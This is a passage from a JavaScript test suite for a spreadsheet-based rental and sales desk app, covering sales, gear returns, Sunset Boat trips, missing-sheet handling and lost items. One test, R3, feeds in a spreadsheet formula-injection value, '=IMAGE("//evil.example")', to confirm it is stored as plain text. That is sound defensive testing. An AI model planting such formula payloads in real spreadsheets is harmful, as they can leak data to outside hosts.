    const env = freshEnv();
    env.book['Gear_Settings'].data.forEach(r => { if (r[0] === 'Manager WhatsApp') { r[1] = b; r[2] = c; } });
    assert.strictEqual(gearOf(env, login(env, 'made')).managerWa, want, JSON.stringify([b, c]));
  }
});

// ---------------- S14 ----------------
test('S14: who sold a line is read incrementally within a push (sale then correction in one push)', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'); openShift(env, ayu);
  const a = newTs(), b = newTs();
  const line = ts => ({ ts, guest: 'Ann', category: 'Service', object: 'Towel', qty: 1, unit: 50000, unitCost: 0 });
  const r = push(env, ayu, op('sale', { saleId: 'a', payment: 'Cash', lines: [line(a)] }), op('line_update', { ts: a, qty: 2 }),
    op('sale', { saleId: 'b', payment: 'Cash', lines: [line(b)] }), op('line_update', { ts: b, qty: 3 }));
  assert.deepStrictEqual(r.results.map(x => x.status), ['applied', 'applied', 'applied', 'applied'], JSON.stringify(r));
  const p = pull(env, ayu);
  assert.deepStrictEqual(p.lines.map(l => [l.qty, l.soldBy]), [[2, 'ayu'], [3, 'ayu']]);
});

// ---------------- second review ----------------
test('R2: a missing Gear_Log is found before the money is written: sale and desk return refused, nothing written', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'), made = login(env, 'made'); openShift(env, ayu);
  // A rental out past its return time, still out at an evening check: the return charges an extension.
  rent(env, ayu, 'Ann', ['SG002']);
  setBack(env, 'SG002', Date.now() - 3 * H);
  count(env, made, [], Date.now() - H);
  const gl = env.book['Gear_Log'];
  delete env.book['Gear_Log'];
  const entries = () => env.book['Entries'].data.length;
  const before = entries(), manual = env.book['Entries Manual'].data.filter(r => r[3]).length;
  let r = push(env, ayu, op('sale', { saleId: 'X1', payment: 'Cash', lines: [rentLine('Bob', 'SG001')] })).results[0];
  assert.deepStrictEqual([r.status, r.error], ['rejected', 'missing_sheet']);
  // The desk return of the late rental (its extension would be written before the gear record).
  const ret = op('gear_return', { gid: id('G'), items: [{ item: 'SG002', condition: 'OK', ext: { ts: newTs(), days: 1 } }] });
  r = push(env, ayu, ret).results[0];
  assert.deepStrictEqual([r.status, r.error], ['rejected', 'missing_sheet']);
  assert.strictEqual(entries(), before, 'no money written without its gear record');
  assert.strictEqual(env.book['Entries Manual'].data.filter(x => x[3]).length, manual);
  // Tab back: the return typed again charges the extension once.
  env.book['Gear_Log'] = gl;
  const again = push(env, ayu, op('gear_return', { gid: id('G'), items: [{ item: 'SG002', condition: 'OK', ext: { ts: newTs(), days: 1 } }] })).results[0];
  assert.strictEqual(again.charged, 1, JSON.stringify(again));
  assert.strictEqual(entries(), before + 1);
});

test('R2: a tab that vanishes after the money was written: partial (retried), never refused', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'); openShift(env, ayu);
  const gl = env.book['Gear_Log'], ent = env.book['Entries'];
  const start = ent.data.length;
  delete env.book['Gear_Log'];
  Object.defineProperty(env.book, 'Gear_Log', { configurable: true, get: () => (ent.data.length > start ? undefined : gl) });
  const sale = op('sale', { saleId: 'X2', payment: 'Cash', lines: [rentLine('Bob', 'SG001')] });
  const r = push(env, ayu, sale);
  assert.ok(r.partial, JSON.stringify(r));
  assert.deepStrictEqual(r.results, []);
  assert.match(r.message, /Gear_Log/);
  assert.strictEqual(ent.data.length, start + 1, 'the money is in');
  // The tab is back: the retry writes the gear record, not the money a second time.
  Object.defineProperty(env.book, 'Gear_Log', { configurable: true, writable: true, value: gl });
  const r2 = push(env, ayu, sale).results[0];
  assert.strictEqual(r2.status, 'applied');
  assert.strictEqual(ent.data.length, start + 1);
  assert.strictEqual(item(gearOf(env, ayu), 'SG001').where, 'out');
});

test('R3: a number typed at the desk never becomes a formula in Gear_Log (D:E, G text)', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'); openShift(env, ayu);
  const F = '=IMAGE("//evil.example")';
  const r = push(env, ayu, op('sale', { saleId: 'X3', payment: 'Cash', lines: [{ ...rentLine('+62 Bob', 'SG001'), gear: F }] })).results[0];
  assert.strictEqual(r.status, 'applied');
  const gl = env.book['Gear_Log'], row = gl.getLastRow();
  assert.strictEqual(gl.data[row - 1][2], 'diff');
  for (let c = 2; c <= 8; c++) assert.notStrictEqual(gl.kind(row, c), 'formula', 'Gear_Log column ' + c);
  assert.ok(gl.formats.some(([rr, c, f]) => rr === 1 && c === 2 && f === '@'), 'B:E text');
  assert.ok(gl.formats.some(([rr, c, f]) => rr === 1 && c === 7 && f === '@'), 'G text');
  const d = pull(env, ayu).gear.diffs.find(x => x.kind === 'sale_unlinked');
  assert.ok(d && d.item.startsWith('=IMAGE'), 'still readable as the number typed');
});

test('R6: Sunset Boat back for a departure where no number left (nothing written) → already, not refused', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'), made = login(env, 'made'); openShift(env, ayu);
  rent(env, ayu, 'Ann', ['SG001']);
  let r = push(env, made, op('sunset_out', { trip: 'Ttrip00001', items: ['SG001'] })).results[0];
  assert.deepStrictEqual(r.items, []);
  r = push(env, made, op('sunset_back', { trip: 'Ttrip00001', items: ['SG001'] })).results[0];
  assert.strictEqual(r.status, 'applied', JSON.stringify(r));
  assert.strictEqual(r.already, true);
  assert.strictEqual(item(gearOf(env, ayu), 'SG001').where, 'out', 'the rental is untouched');
  // A really unknown trip is still refused.
  r = push(env, made, op('sunset_back', { trip: 'Ttrip99999', items: ['SG001'] })).results[0];
  assert.strictEqual(r.error, 'line_not_found');
});

test('R7: "Lost" seen off the Sunset Boat or at the evening check: out of service, SG says Lost', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'), made = login(env, 'made'); openShift(env, ayu);
  push(env, made, op('sunset_out', { trip: 'Ttrip00002', items: ['SG002'] }));
  push(env, made, op('sunset_back', { trip: 'Ttrip00002', items: ['SG002'], conditions: { SG002: 'Lost' } }));
  push(env, made, op('gear_count', { cid: id('K'), items: [{ item: 'SG003', condition: 'Lost' }] }));
  const g = gearOf(env, ayu);
  assert.deepStrictEqual(['SG002', 'SG003'].map(x => [item(g, x).where, item(g, x).condition]), [['lost', 'Lost'], ['lost', 'Lost']]);
  const sg = env.book['SG'].data;
  assert.deepStrictEqual(['SG002', 'SG003'].map(x => sg.find(r => r[0] === x)[3]), ['Lost', 'Lost']);
  assert.ok(gearOf(env, made).unavailable.includes('SG002'));
  // Not rented out again, not on a Volunteer outing.
  const v = push(env, ayu, op('gear_out', { gid: id('G'), items: ['SG002'], days: 1, guest: 'V' })).results[0];
  assert.deepStrictEqual(v.skipped, ['SG002']);
});

test('R9: rental product names compare without case or spaces (same rule as the app)', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'); openShift(env, ayu);
  const r = push(env, ayu, op('sale', { saleId: 'X4', payment: 'Cash', lines: [rentLine('Ann', 'SG001', 1, { object: ' snorkeling   MASK ' })] })).results[0];
  assert.strictEqual(r.status, 'applied');
  const g = gearOf(env, ayu);
  assert.strictEqual(item(g, 'SG001').where, 'out');
  assert.ok(!g.diffs.some(d => d.kind === 'sale_unlinked'));
  // Whole days are required for that spelling too.
  const q = push(env, ayu, op('sale', { saleId: 'X5', payment: 'Cash', lines: [rentLine('Ann', 'SG004', 1.5, { object: 'rabbit  BIKE', gear: '' })] })).results[0];
  assert.strictEqual(q.error, 'bad_amount');
});

test('ping: answers without a session (closing a shift checks the sheet is reachable)', () => {
  const env = freshEnv();
  const r = env.call({ action: 'ping' });
  assert.ok(r.ok && r.serverTime);
});
